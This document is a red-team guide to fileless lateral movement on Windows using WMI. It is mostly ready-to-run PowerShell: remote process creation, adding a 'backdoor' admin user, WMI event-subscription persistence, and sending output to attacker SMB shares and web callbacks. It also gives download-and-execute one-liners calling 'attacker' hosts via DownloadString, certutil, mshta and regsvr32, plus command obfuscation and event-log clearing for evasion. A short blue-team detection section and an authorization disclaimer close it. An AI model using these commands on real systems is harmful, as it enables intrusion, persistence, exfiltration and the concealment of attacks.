# WMI-Based Fileless Lateral Movement Guide

## Table of Contents
1. [Overview](#overview)
2. [Prerequisites](#prerequisites)
3. [Attack Flow](#attack-flow)
4. [Step-by-Step Instructions](#step-by-step-instructions)
5. [Advanced Techniques](#advanced-techniques)
6. [Detection Evasion](#detection-evasion)
7. [Troubleshooting](#troubleshooting)
8. [Cleanup](#cleanup)

---

## Overview

### What is WMI?
Windows Management Instrumentation (WMI) is Microsoft's implementation of Web-Based Enterprise Management (WBEM) and Common Information Model (CIM) standards. It provides a standardized way to query and manage Windows systems.

### Why Use WMI for Lateral Movement?

**Advantages:**
- **Fileless**: No binaries dropped to disk
- **Native**: Built into every Windows system since NT 4.0
- **Stealthy**: Legitimate admin tool, less suspicious than PSExec
- **Versatile**: Can execute commands, query data, create processes
- **Encrypted**: Supports packet privacy for encrypted communications

**OPSEC Benefits:**
- Executes in `wmiprvse.exe` (WMI Provider Host), not cmd.exe
- No SMB file transfer required
- Blends with legitimate administrative activity
- Event logs show as WMI activity, not remote execution

---

## Prerequisites

### Required Permissions
- **Domain Admin** (recommended for this exercise)
- OR **Local Admin** on target system
- OR Membership in **Distributed COM Users** group
- WMI permissions on target namespace (root\cimv2)

### Network Requirements
- **Port 135** (RPC Endpoint Mapper) - TCP
- **Dynamic RPC ports** (49152-65535 by default) - TCP
- **Port 445** (SMB) - Optional, for some WMI operations
- Target must allow **DCOM** connections

### Firewall Rules to Check
```powershell
# On target, verify WMI firewall rules
Get-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)" | Select-Object DisplayName, Enabled

# Common rule names:
# - WMI-RPCSS-In-TCP
# - WMI-WINMGMT-In-TCP
# - WMI-ASYNC-In-TCP
```

---

## Attack Flow

```
Attacker (Domain Admin)
    ↓
1. Test Connectivity (ICMP, RPC Port 135)
    ↓
2. Validate WMI Access (Query Win32_OperatingSystem)
    ↓
3. Execute Command via WMI
    ├─ Method 1: Win32_Process.Create (Most common)
    ├─ Method 2: WMI Event Subscription (Stealthier)
    └─ Method 3: CIM (Modern alternative)
    ↓
4. Monitor Process Completion
    ↓
5. Retrieve Results (via SMB share, web callback, or logs)
    ↓
6. Cleanup (Remove event subscriptions if used)
```

---

## Step-by-Step Instructions

### Basic Usage

#### Example 1: Simple Command Execution
```powershell
.\WMI-LateralMovement.ps1 -Target DC01 -Command "whoami"
```

**Expected Output:**
```
[*] Testing connectivity to DC01...
[+] WMI access confirmed - Target OS: Microsoft Windows Server 2019 Standard
[+] Command executed successfully via WMI
[+] Process ID: 4328
```

#### Example 2: Execute with Output Redirection
```powershell
# Create SMB share on attacker system first
New-SmbShare -Name "RedTeam" -Path "C:\RedTeamShare" -FullAccess "Everyone"

# Execute command and redirect output to share
.\WMI-LateralMovement.ps1 -Target 192.168.1.50 -Command "cmd /c ipconfig > \\AttackerIP\RedTeam\output.txt"

# Retrieve results
Get-Content "C:\RedTeamShare\output.txt"
```

#### Example 3: Using Explicit Credentials
```powershell
$cred = Get-Credential DOMAIN\Administrator

.\WMI-LateralMovement.ps1 -Target WEB01 -Command "net user backdoor P@ssw0rd /add" -Credential $cred
```

#### Example 4: Execute PowerShell Remotely (In-Memory)
```powershell
# Base64 encode a PowerShell command
$command = "Get-Process | Out-File C:\temp\processes.txt"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)

# Execute via WMI
.\WMI-LateralMovement.ps1 -Target SQL01 -Command "powershell -enc $encoded"
```

---

## Advanced Techniques

### 1. Living Off The Land - Manual WMI Commands

If you can't use the script, here are pure PowerShell one-liners:

#### Basic Process Creation
```powershell
Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami"
```

#### With Credentials
```powershell
$cred = Get-Credential
Invoke-WmiMethod -ComputerName TARGET -Credential $cred -Class Win32_Process -Name Create -ArgumentList "notepad.exe"
```

#### Query Target Information
```powershell
# Get OS info
Get-WmiObject -ComputerName TARGET -Class Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber

# Get logged-on users
Get-WmiObject -ComputerName TARGET -Class Win32_LoggedOnUser

# Get running processes
Get-WmiObject -ComputerName TARGET -Class Win32_Process | Select-Object ProcessId, Name, CommandLine

# Get installed software
Get-WmiObject -ComputerName TARGET -Class Win32_Product | Select-Object Name, Version
```

### 2. WMI Event Subscription (Stealthier)

This method is more OPSEC-safe because:
- No immediate process creation
- Triggered by system events
- Harder to attribute to specific admin action

**Manual Steps:**
```powershell
$target = "DC01"
$cred = Get-Credential

# 1. Create Event Filter (trigger)
$filterArgs = @{
    Name = "MyFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$filter = Set-WmiInstance -ComputerName $target -Credential $cred -Namespace "root\subscription" -Class __EventFilter -Arguments $filterArgs

# 2. Create Consumer (action)
$consumerArgs = @{
    Name = "MyConsumer"
    CommandLineTemplate = "cmd.exe /c net user backdoor Password123! /add"
}
$consumer = Set-WmiInstance -ComputerName $target -Credential $cred -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments $consumerArgs

# 3. Bind them together
$bindingArgs = @{
    Filter = $filter
    Consumer = $consumer
}
$binding = Set-WmiInstance -ComputerName $target -Credential $cred -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments $bindingArgs

# Wait for event to trigger (60 seconds)
Start-Sleep 65

# 4. CLEANUP - IMPORTANT!
Remove-WmiObject -InputObject $binding
Remove-WmiObject -InputObject $consumer
Remove-WmiObject -InputObject $filter
```

### 3. Encrypted WMI Sessions

For maximum OPSEC, use packet privacy:

```powershell
# Create CIM session with encryption
$sessionOption = New-CimSessionOption -Protocol Dcom
$session = New-CimSession -ComputerName TARGET -SessionOption $sessionOption -Authentication PacketPrivacy

# Execute command
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="whoami"}

# Cleanup
Remove-CimSession -CimSession $session
```

### 4. Output Retrieval Methods

**Method A: SMB Share (Simplest)**
```powershell
# On attacker system
New-SmbShare -Name "exfil" -Path "C:\exfil" -FullAccess "Everyone"

# Execute with output redirection
Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > \\AttackerIP\exfil\out.txt"

# Read results
Get-Content C:\exfil\out.txt
```

**Method B: Web Callback**
```powershell
# Setup web server on attacker (Python)
# python3 -m http.server 8080

# Execute PowerShell with web callback
$cmd = @"
`$output = whoami
Invoke-WebRequest -Uri 'http://AttackerIP:8080/?' -Method POST -Body `$output
"@

$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)

Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList "powershell -enc $encoded"
```

**Method C: Registry Storage**
```powershell
# Execute with output to registry
$cmd = @"
cmd /c whoami > C:\temp\out.txt
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Output /v Data /t REG_SZ /d `$(Get-Content C:\temp\out.txt) /f
"@

Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList "powershell -c `"$cmd`""

# Read from registry via WMI
$reg = Get-WmiObject -ComputerName TARGET -Namespace "root\default" -List | Where-Object {$_.Name -eq "StdRegProv"}
# ... (complex registry reading via WMI)
```

---

## Detection Evasion

### What Blue Teams Look For

**Common WMI Detection Signatures:**
1. Event ID 4688 (Process Creation) with parent process `wmiprvse.exe`
2. WMI-Activity Operational logs (Event ID 5857-5861)
3. Sysmon Event ID 1 (Process Create) with parent `wmiprvse.exe`
4. Network connections to port 135 from unusual sources
5. WMI namespace modifications (Event Consumer creation)

### Evasion Techniques

#### 1. Blend with Legitimate Traffic
- Execute during business hours when admins are active
- Use legitimate admin account names
- Mimic normal admin tasks (query first, then execute)

#### 2. Obfuscate Commands
```powershell
# Instead of: whoami
# Use: cmd /c w%PROCESSOR_ARCHITECTURE:~-2,1%%OS:~-1%ami

# Instead of: net user
# Use: n^e^t u^s^e^r

# Or use PowerShell obfuscation
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')
```

#### 3. Avoid Obvious IOCs
- Don't use `cmd.exe` directly - use `powershell -WindowStyle Hidden`
- Don't create users named "admin", "backdoor", "hack", etc.
- Avoid sequential attacks - add random delays
- Clean up WMI event subscriptions immediately

#### 4. Use Native Binaries (LOLBAS)
```powershell
# Instead of custom malware, use:
# - certutil for download: certutil -urlcache -f http://attacker/file.exe C:\temp\file.exe
# - mshta for execution: mshta http://attacker/payload.hta
# - rundll32 for DLL execution: rundll32 payload.dll,EntryPoint
# - regsvr32 for remote SCT: regsvr32 /s /n /u /i:http://attacker/file.sct scrobj.dll
```

#### 5. Timing and Throttling
```powershell
# Add random delays between operations
Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 300)

# Don't hit multiple targets simultaneously
# Space out lateral movement over hours/days
```

---

## Troubleshooting

### Error: "Access Denied"

**Causes:**
- Insufficient privileges
- WMI permissions not granted
- UAC filtering (local admin but not RID 500)

**Solutions:**
```powershell
# Check current privileges
whoami /groups | findstr "S-1-5-32-544"  # Should show Administrators

# Verify WMI permissions on target
# Run on target system:
Set-WmiNamespaceSecurity -Namespace "root/cimv2" -Operation Add -Account "DOMAIN\Username" -Permissions Enable,RemoteAccess,ReadSecurity

# Or use Domain Admin account
```

### Error: "RPC Server Unavailable"

**Causes:**
- Firewall blocking port 135
- WMI service not running
- Network connectivity issue

**Solutions:**
```powershell
# Test RPC port
Test-NetConnection -ComputerName TARGET -Port 135

# Check WMI service on target
Get-Service -ComputerName TARGET -Name Winmgmt

# Verify firewall rules on target
# Run on target:
Enable-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)"
```

### Error: "Invalid Class"

**Causes:**
- Typo in WMI class name
- Class doesn't exist on target OS

**Solutions:**
```powershell
# List available classes
Get-WmiObject -ComputerName TARGET -Namespace "root\cimv2" -List | Select-Object Name

# Verify specific class
Get-WmiObject -ComputerName TARGET -Class Win32_Process -List
```

### No Output from Commands

**Remember:** WMI doesn't capture stdout by default!

**Solutions:**
1. Redirect to file share (shown above)
2. Use PowerShell with callback
3. Write to Windows Event Log and query it
4. Use scheduled tasks to execute and store output

---

## Cleanup

### Remove WMI Event Subscriptions

```powershell
$target = "DC01"

# List all event subscriptions
Get-WmiObject -ComputerName $target -Namespace "root\subscription" -Class __EventFilter
Get-WmiObject -ComputerName $target -Namespace "root\subscription" -Class CommandLineEventConsumer
Get-WmiObject -ComputerName $target -Namespace "root\subscription" -Class __FilterToConsumerBinding

# Remove specific subscriptions (replace NAME with actual name)
Get-WmiObject -ComputerName $target -Namespace "root\subscription" -Class __FilterToConsumerBinding -Filter "Filter='__EventFilter.Name=\"NAME\"'" | Remove-WmiObject

Get-WmiObject -ComputerName $target -Namespace "root\subscription" -Class CommandLineEventConsumer -Filter "Name='NAME'" | Remove-WmiObject

Get-WmiObject -ComputerName $target -Namespace "root\subscription" -Class __EventFilter -Filter "Name='NAME'" | Remove-WmiObject
```

### Clear WMI Event Logs

```powershell
# On target system (or via Invoke-Command)
wevtutil cl Microsoft-Windows-WMI-Activity/Operational
```

---

## Detection Testing

After executing your attack, check if your blue team detected it:

### Expected Event IDs

**Event ID 4688** (Security Log - Process Creation)
```
Parent Process: C:\Windows\System32\wbem\WmiPrvSE.exe
New Process: C:\Windows\System32\cmd.exe
```

**Event ID 5861** (Microsoft-Windows-WMI-Activity/Operational)
```
Operation: Provider operation
ResultCode: 0x0
```

**Sysmon Event ID 1** (Process Creation)
```
ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
Image: C:\Windows\System32\cmd.exe
ParentCommandLine: C:\Windows\system32\wbem\wmiprvse.exe
```

**Sysmon Event ID 3** (Network Connection)
```
DestinationPort: 135
Image: C:\Windows\System32\svchost.exe
```

### Purple Team Discussion Points

After the exercise, discuss with blue team:
1. Did they see the WMI execution?
2. What alerted them (if anything)?
3. Could they distinguish it from legitimate admin activity?
4. What additional logging would help?

**Recommendations for Blue Team:**
- Enable WMI-Activity operational logging
- Monitor for `wmiprvse.exe` spawning unusual children
- Alert on WMI event consumer creation
- Baseline normal WMI usage patterns
- Monitor RPC connections from workstations to servers

---

## References

- [MITRE ATT&CK T1047 - Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047/)
- [Microsoft WMI Documentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page)
- [LOLBAS - Living Off The Land Binaries](https://lolbas-project.github.io/)

---

**Remember:** This is for authorized red team training only. Unauthorized use is illegal.
